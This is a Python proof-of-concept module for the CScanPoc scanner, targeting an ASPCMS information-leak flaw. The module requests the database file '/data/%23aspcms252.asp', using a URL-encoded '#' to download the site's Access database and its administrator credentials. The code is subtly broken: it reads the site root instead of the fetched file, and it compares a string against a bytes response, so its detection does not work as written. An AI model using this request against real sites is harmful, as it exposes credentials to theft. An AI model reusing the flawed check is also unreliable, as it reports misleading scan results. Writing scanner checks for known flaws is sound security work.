# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import urllib.request, urllib.error, urllib.parse
import http.cookiejar


class Vuln(ABVuln):
    vuln_id = 'ASPCMS_0001'  # 平台漏洞编号，留空
    name = 'ASPCMS信息泄漏包括管理员帐号'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INFO_LEAK  # 漏洞类型
    disclosure_date = ' 2014-05-15'  # 漏洞公布时间
    desc = '''
        在ASPCMS最新版2.5.2以及ASPCMS2.3.x中，ASPCMS的数据库在/data/目录下，为了防止数据库被下载，把数据库文件data.mdb重新命名为#data.asp，由于设置不当，使用%23编码#即可绕过访问，导致信息泄漏。
    '''  # 漏洞描述
    ref = 'https://www.seebug.org/vuldb/ssvid-90501'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'ASPCMS'  # 漏洞应用名称
    product_version = 'ASPCMS最新版2.5.2以及ASPCMS2.3.x'  # 漏洞应用版本


class NoExceptionCookieProcesser(urllib.request.HTTPCookieProcessor):
    def http_error_403(self, req, fp, code, msg, hdrs):
        return fp

    def http_error_400(self, req, fp, code, msg, hdrs):
        return fp

    def http_error_500(self, req, fp, code, msg, hdrs):
        return fp


class Poc(ABPoc):
    poc_id = '90fba81d-4724-4b72-84ff-832cc40213b8'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-03'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }
                    
    def verify(self):
        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # http://www.wooyun.org/bugs/wooyun-2010-060483
            cookie = http.cookiejar.CookieJar()
            cookie_handler = NoExceptionCookieProcesser(cookie)
            opener = urllib.request.build_opener(cookie_handler, urllib.request.HTTPHandler)
            opener.open(self.target + '/data/%23aspcms252.asp')
            urllib.request.install_opener(opener)
            content = urllib.request.urlopen(self.target).read()

            if 'Standard Jet DB' in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()